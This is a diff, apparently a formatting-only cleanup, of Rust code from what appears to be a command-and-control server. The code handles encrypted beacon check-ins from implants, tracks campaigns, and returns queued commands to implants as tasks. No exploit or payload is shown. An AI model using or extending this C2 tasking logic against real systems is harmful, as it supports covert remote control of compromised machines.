@@ -134,7 +134,8 @@ impl ProtocolHandler {
                 let frame_type = plaintext[8];
                 let inner_payload = &plaintext[28..];
 
-                if frame_type == 0x06 { // FRAME_REKEY_DH
+                if frame_type == 0x06 {
+                    // FRAME_REKEY_DH
                     debug!("Received explicit REKEY_DH frame from {}", src_addr);
                     session.transport.rekey_dh();
                     session.packet_count = 0;
@@ -167,18 +168,19 @@ impl ProtocolHandler {
                     return Some(response);
                 }
 
-                if frame_type == 0x07 { // FRAME_PQ_KEX
+                if frame_type == 0x07 {
+                    // FRAME_PQ_KEX
                     debug!("Received PQ KEX frame from {}", src_addr);
-                    
+
                     if let Ok(pk) = pq::public_key_from_bytes(inner_payload) {
                         let mut rng = SecureRng::new();
                         let (ct, ss) = pq::encapsulate(&mut rng, &pk);
-                        
+
                         // Mix PQ secret into session ratchet
                         session.transport.mix_key(&ss);
-                        
+
                         let ct_bytes = pq::ciphertext_to_vec(&ct);
-                        
+
                         // Respond with Ciphertext frame
                         let mut frame = Vec::with_capacity(28 + ct_bytes.len());
                         frame.extend_from_slice(b"WRTH");
@@ -212,14 +214,17 @@ impl ProtocolHandler {
                 // Default to DATA frame logic if type is DATA (0x01) or fallback
                 // The original code didn't check frame_type, so we preserve that for 0x01 or others for now,
                 // but realistically it should only be 0x01.
-                if frame_type == 0x01 || frame_type == 0x05 { // DATA or MESH_RELAY (though mesh is handled below usually)
+                if frame_type == 0x01 || frame_type == 0x05 {
+                    // DATA or MESH_RELAY (though mesh is handled below usually)
                     // Try to parse as BeaconData
                     if let Ok(beacon) = serde_json::from_slice::<BeaconData>(inner_payload) {
                         debug!("Beacon Checkin: {}", beacon.id);
                         let _ = self.event_tx.send(Event {
                             id: uuid::Uuid::new_v4().to_string(),
                             r#type: "beacon_checkin".to_string(),
-                            timestamp: Some(prost_types::Timestamp::from(std::time::SystemTime::now())),
+                            timestamp: Some(prost_types::Timestamp::from(
+                                std::time::SystemTime::now(),
+                            )),
                             campaign_id: "".to_string(),
                             implant_id: beacon.id.clone(),
                             data: std::collections::HashMap::new(),
@@ -231,7 +236,10 @@ impl ProtocolHandler {
                             match self.db.get_pending_commands(implant_uuid).await {
                                 Ok(cmds) => cmds,
                                 Err(e) => {
-                                    error!("Failed to get pending commands for {}: {}", beacon.id, e);
+                                    error!(
+                                        "Failed to get pending commands for {}: {}",
+                                        beacon.id, e
+                                    );
                                     vec![]
                                 }
                             }
@@ -244,8 +252,10 @@ impl ProtocolHandler {
                             .map(|c| BeaconTask {
                                 id: c.id.to_string(),
                                 type_: c.command_type,
-                                payload: String::from_utf8_lossy(c.payload.as_deref().unwrap_or(&[]))
-                                    .to_string(),
+                                payload: String::from_utf8_lossy(
+                                    c.payload.as_deref().unwrap_or(&[]),
+                                )
+                                .to_string(),
                             })
                             .collect();
 
